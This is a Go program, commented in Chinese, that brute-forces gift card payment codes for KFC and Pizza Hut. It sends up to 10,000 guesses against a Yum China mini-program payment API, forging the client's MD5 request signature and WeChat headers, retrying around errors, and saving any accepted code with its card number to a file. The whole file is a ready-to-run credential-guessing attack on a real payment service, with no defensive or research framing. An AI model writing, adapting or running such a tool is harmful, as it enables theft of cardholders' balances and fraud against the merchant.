package main

// 礼品卡 paymentCode 多线程枚举 (Go 版)
// 支持 KFC礼品卡的支付码枚举，通过 config.json 配置
// 优化版：记录重试次数 > 7 的密码，并输出成功密码（若有）

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Config 配置文件结构
type Config struct {
	CardSequence  string   `json:"cardSequence"`
	PaymentPrefix string   `json:"paymentPrefix"`
	Token         string   `json:"token"`
	OpenID        string   `json:"openId"`
	SecretKey     string   `json:"secretKey"`
	EncodeList    []string `json:"encodeList"`
	Referer       string   `json:"referer"`
	Host          string   `json:"host"`
	ClientKey     string   `json:"clientKey"`
	ClientSec     string   `json:"clientSec"`
	SignPath      string   `json:"signPath"`
	FullURL       string   `json:"fullUrl"`
	Threads       int      `json:"threads"`
	MaxRetry      int      `json:"maxRetry"`
	RetryWait     int      `json:"retryWait"`
}

// RequestBody 请求体
type RequestBody struct {
	Token               string   `json:"token"`
	CardSequence        string   `json:"cardSequence"`
	PaymentCode         string   `json:"paymentCode"`
	OpenID              *string  `json:"openId,omitempty"`
	EncodeList          []string `json:"encodeList"`
	IsFromCustomerClient bool    `json:"isFromCustomerClient"`
	SecretKey           string   `json:"secretKey"`
}

// Response 响应体
type Response struct {
	ErrCode   interface{} `json:"errCode"`
	ErrData   string      `json:"errData"`
	ErrMsg    string      `json:"errMsg"`
	ErrorCode interface{} `json:"errorCode"`
	Data      interface{} `json:"data"`
}

var (
	cfg          Config
	doneCount    atomic.Int64
	httpClient   *http.Client
	retryMap     sync.Map          // key: paymentCode, value: *int (重试次数)
	retryMapMu   sync.Mutex
	totalRetries atomic.Int64
	foundPwd     string            // 真实密码（仅记录，不写入文件，但会包含在最终输出）
	foundOnce    sync.Once
	logMutex     sync.Mutex        // 用于控制台输出互斥
)

// 读取可执行文件同目录下的配置文件
func readConfigNearExe(filename string) ([]byte, error) {
	exePath, err := os.Executable()
	if err != nil {
		return nil, err
	}
	exeDir := filepath.Dir(exePath)
	configPath := filepath.Join(exeDir, filename)
	return os.ReadFile(configPath)
}

// 安全的控制台输出
func safePrintf(format string, a ...interface{}) {
	logMutex.Lock()
	defer logMutex.Unlock()
	fmt.Printf(format, a...)
}

// calcKbsv 计算签名
func calcKbsv(timestamp, bodyJSON string) string {
	raw := cfg.ClientKey + "\t" + cfg.ClientSec + "\t" + timestamp + "\t" + cfg.SignPath + "\t\t" + bodyJSON
	h := md5.Sum([]byte(raw))
	return hex.EncodeToString(h[:])
}

// tryOne 尝试一个卡密后缀，返回响应文本
func tryOne(suffix string) string {
	paymentCode := cfg.PaymentPrefix + suffix
	timestamp := fmt.Sprintf("%d", time.Now().UnixMilli())

	body := RequestBody{
		Token:               cfg.Token,
		CardSequence:        cfg.CardSequence,
		PaymentCode:         paymentCode,
		EncodeList:          cfg.EncodeList,
		IsFromCustomerClient: true,
		SecretKey:           cfg.SecretKey,
	}
	if cfg.OpenID != "" {
		oid := cfg.OpenID
		body.OpenID = &oid
	}

	bodyBytes, _ := json.Marshal(body)
	bodyJSON := string(bodyBytes)
	kbsv := calcKbsv(timestamp, bodyJSON)

	req, err := http.NewRequest("POST", cfg.FullURL, strings.NewReader(bodyJSON))
	if err != nil {
		return fmt.Sprintf(`{"errCode":-1,"errMsg":"异常:%s"}`, err.Error())
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Yumc-Route-Cell", "yumc4")
	req.Header.Set("X-Yumc-Route-Channel", "weapp")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2541b17) XWEB/20005")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Rcsdcid", "rcsdcid")
	req.Header.Set("Rcsav", "")
	req.Header.Set("Wechat-Platform", "windows")
	req.Header.Set("Wechat-Os-Version", "Windows 11 x64")
	req.Header.Set("Wechat-Language", "zh_CN")
	req.Header.Set("Wechat-Version", "4.1.11.23")
	req.Header.Set("Wechat-Model", "microsoft")
	req.Header.Set("Wechat-Pixelratio", "1")
	req.Header.Set("Xweb_Xhr", "1")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	// 移除 Accept-Encoding，由 Go 自动处理
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	if cfg.Referer != "" {
		req.Header.Set("Referer", cfg.Referer)
	}
	if cfg.Host != "" {
		req.Header.Set("Host", cfg.Host)
	}
	req.Header.Set("kbck", cfg.ClientKey)
	req.Header.Set("kbcts", timestamp)
	req.Header.Set("kbsv", kbsv)

	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Sprintf(`{"errCode":-1,"errMsg":"请求异常:%s"}`, err.Error())
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return string(data)
}

// parseErrCode 将 errCode 转为字符串
func parseErrCode(code interface{}) string {
	switch v := code.(type) {
	case float64:
		return fmt.Sprintf("%v", int64(v))
	case string:
		return v
	case nil:
		return ""
	default:
		return fmt.Sprintf("%v", v)
	}
}

// 原子增加某个密码的重试计数
func incrementRetryCount(paymentCode string) {
	actual, _ := retryMap.LoadOrStore(paymentCode, new(int))
	countPtr := actual.(*int)
	retryMapMu.Lock()
	*countPtr++
	retryMapMu.Unlock()
	totalRetries.Add(1)
}

// worker 工作线程
func worker(jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for suffix := range jobs {
		paymentCode := cfg.PaymentPrefix + suffix
		retry := 0
		for {
			body := tryOne(suffix)
			var resp Response
			json.Unmarshal([]byte(body), &resp)
			errCode := parseErrCode(resp.ErrCode)
			msg := resp.ErrMsg

			// 成功：errCode=0 且有 data
			if errCode == "0" && resp.Data != nil {
				foundOnce.Do(func() {
					foundPwd = paymentCode
					safePrintf("\n%s\n", strings.Repeat("=", 60))
					safePrintf(">>> ✅ 真实密码被探测到: %s\n", paymentCode)
					safePrintf(">>> （完整遍历将继续，以收集重试数据）\n")
					safePrintf("%s\n\n", strings.Repeat("=", 60))
				})
				doneCount.Add(1)
				break
			}

			// 541 = 卡号或密码错误，直接跳过
			if strings.Contains(errCode, "541") {
				doneCount.Add(1)
				break
			}

			// 其他错误 → 重试
			if retry < cfg.MaxRetry {
				incrementRetryCount(paymentCode)
				reason := msg
				if reason == "" {
					reason = "响应异常(" + body + ")"
				}
				safePrintf("[%s] %s -> 等待%ds后重试 (第%d次)\n", paymentCode, reason, cfg.RetryWait, retry+1)
				time.Sleep(time.Duration(cfg.RetryWait) * time.Second)
				retry++
				continue
			}
			// 达到最大重试次数
			safePrintf("[%s] 已达最大重试次数(%d)，跳过\n", paymentCode, cfg.MaxRetry)
			doneCount.Add(1)
			break
		}
	}
}

// writeAnalysis 生成分析报告
func writeAnalysis() {
	// 收集重试次数 > 7 的密码
	type record struct {
		pwd   string
		count int
	}
	var highRetry []record
	retryMap.Range(func(key, value interface{}) bool {
		pwd := key.(string)
		countPtr := value.(*int)
		if *countPtr > 7 {
			highRetry = append(highRetry, record{pwd: pwd, count: *countPtr})
		}
		return true
	})

	// 按重试次数降序排序（可选）
	// 简单起见，不排序，直接写入

	file, err := os.Create("retry_analysis.txt")
	if err != nil {
		safePrintf("创建 retry_analysis.txt 失败: %v\n", err)
		return
	}
	defer file.Close()

	// 第一部分：重试次数 > 7 的密码
	fmt.Fprintln(file, "重试次数大于7的密码:")
	if len(highRetry) == 0 {
		fmt.Fprintln(file, "（无）")
	} else {
		for _, r := range highRetry {
			fmt.Fprintf(file, "%s: %d\n", r.pwd, r.count)
		}
	}

	// 第二部分：如果找到真实密码，输出卡号和密码
	if foundPwd != "" {
		fmt.Fprintln(file, "\n成功密码:")
		fmt.Fprintf(file, "卡号(cardSequence): %s\n", cfg.CardSequence)
		fmt.Fprintf(file, "密码(paymentCode): %s\n", foundPwd)
	}

	safePrintf("\n✅ 分析报告已写入 retry_analysis.txt\n")
}

func main() {
	// 1. 读取 exe 同目录的 config.json
	configData, err := readConfigNearExe("config.json")
	if err != nil {
		fmt.Printf("读取 config.json 失败: %s\n", err)
		fmt.Println("请将 config.json 放在本程序同一目录下")
		waitExit()
		os.Exit(1)
	}
	if err := json.Unmarshal(configData, &cfg); err != nil {
		fmt.Printf("解析 config.json 失败: %s\n", err)
		waitExit()
		os.Exit(1)
	}

	// 默认值
	if cfg.Threads == 0 {
		cfg.Threads = 20
	}
	if cfg.MaxRetry == 0 {
		cfg.MaxRetry = 5
	}
	if cfg.RetryWait == 0 {
		cfg.RetryWait = 3
	}

	// 2. HTTP 客户端（使用默认 TLS，不跳过证书）
	httpClient = &http.Client{
		Timeout: 15 * time.Second,
		// 不设置 Transport，使用默认（即不跳过证书验证）
	}

	// 3. 品牌识别
	brand := "未知"
	if cfg.SecretKey == "kfc" {
		brand = "肯德基 KFC"
	} else if cfg.SecretKey == "ph" {
		brand = "必胜客 Pizza Hut"
	}

	// 4. 打印启动信息
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("礼品卡 paymentCode 多线程枚举 [%s] (重试分析模式)\n", brand)
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("卡号(cardSequence): %s\n", cfg.CardSequence)
	fmt.Printf("密码前缀:           %s\n", cfg.PaymentPrefix)
	fmt.Printf("枚举范围:           %s0000 ~ %s9999\n", cfg.PaymentPrefix, cfg.PaymentPrefix)
	fmt.Printf("接口地址:           %s\n", cfg.FullURL)
	fmt.Printf("线程数:             %d\n", cfg.Threads)
	fmt.Printf("最大重试:           %d 次\n", cfg.MaxRetry)
	fmt.Printf("成功条件:           errCode = 0 且 data 非空\n")
	fmt.Println("输出文件:           retry_analysis.txt")
	fmt.Printf("\n%s\n\n", strings.Repeat("=", 60))

	start := time.Now()

	// 5. 工作池
	jobs := make(chan string, 1000)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go worker(jobs, &wg)
	}

	// 6. 进度监控（带退出信号）
	progressDone := make(chan struct{})
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-progressDone:
				return
			case <-ticker.C:
				done := doneCount.Load()
				elapsed := time.Since(start).Seconds()
				rate := float64(done) / elapsed
				safePrintf("\n--- 进度: %d/10000 | %.0f req/s | 已用 %.0fs ---\n\n", done, rate, elapsed)
			}
		}
	}()

	// 7. 投递任务
	for i := 0; i < 10000; i++ {
		jobs <- fmt.Sprintf("%04d", i)
	}
	close(jobs)

	// 8. 等待所有 worker 完成
	wg.Wait()
	close(progressDone) // 通知进度监控退出

	// 9. 写入分析报告
	writeAnalysis()

	// 10. 最终统计
	elapsed := time.Since(start).Seconds()
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	if foundPwd != "" {
		fmt.Printf("✅ 真实密码为: %s (已记录在报告末尾)\n", foundPwd)
	} else {
		fmt.Println("❌ 未找到真实密码 (errCode=0 且 data 非空)")
	}
	fmt.Printf("总耗时: %.0fs\n", elapsed)
	fmt.Printf("总重试次数: %d\n", totalRetries.Load())
	fmt.Println("重试明细已保存至 retry_analysis.txt")
	fmt.Println(strings.Repeat("=", 60))

	// 11. 等待用户按键退出
	waitExit()
}

// 退出前等待用户按键
func waitExit() {
	fmt.Println("\n按回车键退出...")
	fmt.Scanln()
}